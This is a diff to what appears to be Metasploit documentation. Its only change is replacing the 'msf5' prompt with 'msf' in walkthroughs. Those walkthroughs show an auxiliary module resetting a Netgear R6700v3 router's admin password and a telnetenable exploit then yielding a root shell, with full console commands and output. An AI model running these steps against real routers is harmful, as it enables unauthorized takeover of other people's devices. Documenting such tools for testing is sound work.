@@ -54,8 +54,8 @@ upnpd port on the target. Default 5000.
 ### Netgear R6700v3 firmware version V1.0.4.84_10.0.58
 
 ```
-    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+    msf > use auxiliary/admin/http/netgear_r6700_pass_reset
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > show options
     
     Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
     
@@ -67,13 +67,13 @@ upnpd port on the target. Default 5000.
        SSL      false            no        Negotiate SSL/TLS for outgoing connections
        VHOST                     no        HTTP server virtual host
     
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
     RHOSTS => 192.168.1.1
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > check
     
     [*] Target is running firmware version 1.0.4.84
     [*] 192.168.1.1:5000 - The target appears to be vulnerable.
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
     [*] Running module against 192.168.1.1
     
     [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
@@ -93,24 +93,24 @@ upnpd port on the target. Default 5000.
     [*]     2.7- run it and login with 'admin:<WHATEVER>'
     [*] 3- Enjoy your root shell!
     [*] Auxiliary module execution completed
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) >
 ```
 
 Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
 session running as `root`, entered the following commands:
 
 ```
-    msf5 > use exploit/linux/telnet/netgear_telnetenable
+    msf > use exploit/linux/telnet/netgear_telnetenable
     [*] No payload configured, defaulting to cmd/unix/interact
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
+    msf exploit(linux/telnet/netgear_telnetenable) > set username admin
     username => admin
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
+    msf exploit(linux/telnet/netgear_telnetenable) > set password testing123
     password => testing123
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
+    msf exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
     MAC => D56C89FC94C9
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOSTS 192.168.1.1
+    msf exploit(linux/telnet/netgear_telnetenable) > set RHOSTS 192.168.1.1
     RHOSTS => 192.168.1.1
-    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
+    msf exploit(linux/telnet/netgear_telnetenable) > exploit
     
     [+] 192.168.1.1:23 - Detected telnetenabled on UDP
     [+] 192.168.1.1:23 - Using creds admin:testing123
@@ -147,8 +147,8 @@ session running as `root`, entered the following commands:
 ### Netgear R6700v3 firmware version V1.0.0.4.82_10.0.57
 
 ```
-    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+    msf > use auxiliary/admin/http/netgear_r6700_pass_reset
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > show options
     
     Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
     
@@ -160,13 +160,13 @@ session running as `root`, entered the following commands:
        SSL      false            no        Negotiate SSL/TLS for outgoing connections
        VHOST                     no        HTTP server virtual host
     
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
     RHOSTS => 192.168.1.1
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > check
     
     [*] Target is running firmware version 1.0.4.82
     [*] 192.168.1.1:5000 - The target appears to be vulnerable.
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
     [*] Running module against 192.168.1.1
     
     [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.
@@ -186,16 +186,16 @@ session running as `root`, entered the following commands:
     [*]     2.7- run it and login with 'admin:<WHATEVER>'
     [*] 3- Enjoy your root shell!
     [*] Auxiliary module execution completed
-    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
+    msf auxiliary(admin/http/netgear_r6700_pass_reset) >
 ```
 
 Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
 session running as `root`, entered the following commands:
 
 ```
-    msf5 > use exploit/linux/telnet/netgear_telnetenable
+    msf > use exploit/linux/telnet/netgear_telnetenable
     [*] No payload configured, defaulting to cmd/unix/interact
-    msf5 exploit(linux/telnet/netgear_telnetenable) > show options
+    msf exploit(linux/telnet/netgear_telnetenable) > show options
     
     Module options (exploit/linux/telnet/netgear_telnetenable):
     
@@ -226,15 +226,15 @@ session running as `root`, entered the following commands:
        0   Automatic (detect TCP or UDP)
     
     
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOST 192.168.1.1
+    msf exploit(linux/telnet/netgear_telnetenable) > set RHOST 192.168.1.1
     RHOST => 192.168.1.1
-    set msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
+    set msf exploit(linux/telnet/netgear_telnetenable) > set username admin
     username => admin
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
+    msf exploit(linux/telnet/netgear_telnetenable) > set password testing123
     password => testing123
-    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
+    msf exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
     MAC => D56C89FC94C9
-    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
+    msf exploit(linux/telnet/netgear_telnetenable) > exploit
     
     [+] 192.168.1.1:23 - Detected telnetenabled on UDP
     [+] 192.168.1.1:23 - Using creds admin:testing123
